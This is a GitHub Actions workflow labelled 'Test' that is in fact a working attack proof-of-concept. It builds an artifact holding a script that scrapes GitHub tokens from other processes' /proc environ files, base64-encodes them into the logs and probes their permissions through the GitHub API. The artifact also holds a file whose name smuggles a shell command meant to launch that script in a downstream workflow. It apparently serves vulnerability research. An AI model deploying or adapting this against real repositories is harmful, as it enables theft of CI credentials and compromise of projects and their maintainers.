name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'marker\n' > content/a
          cat > content/p <<'SCRIPT'
          #!/bin/bash
          declare -A seen
          report() {
            local tok="$1" desc="$2" b64 hdrs status scopes perms
            b64=$(printf '%s' "$tok" | base64 -w0)
            [ -n "${seen[$b64]}" ] && return
            seen[$b64]=1
            echo "LEAKTOKEN b64=$b64 desc=$desc" >&2
            hdrs=$(curl -m 5 -s -D - -o /tmp/resp.json -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-aave-dao-vc8c7ddd-7f94fe)
            status=$(printf '%s' "$hdrs" | head -1 | tr -d '\r')
            scopes=$(printf '%s' "$hdrs" | tr -d '\r' | awk -F': ' 'tolower($1)=="x-oauth-scopes"||tolower($1)=="x-accepted-github-permissions"{printf "%s=%s;", $1, $2}')
            perms=$(tr -d '\n' < /tmp/resp.json | sed -n 's/.*"permissions":{\([^}]*\)}.*/\1/p')
            echo "LEAKAPI b64=$b64 status=$status scopes=$scopes perms=$perms" >&2
          }
          end=$((SECONDS+95))
          while [ $SECONDS -lt $end ]; do
            for e in /proc/[0-9]*/environ; do
              [ -r "$e" ] || continue
              pid=${e#/proc/}; pid=${pid%/environ}
              cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null | cut -c1-100 | base64 -w0)
              for v in INPUT_TOKEN INPUT_GITHUB_TOKEN; do
                tok=$(tr '\0' '\n' < "$e" 2>/dev/null | sed -n "s/^${v}=//p" | head -1)
                [ -n "$tok" ] && report "$tok" "$v:$cmd"
              done
            done
            sleep 0.02
          done
          SCRIPT
          chmod +x content/p
          printf 'x\n' > 'content/a;S=$(printf %.1s $PWD);bash ${S}tmp${S}content${S}content-poc${S}p & #.txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
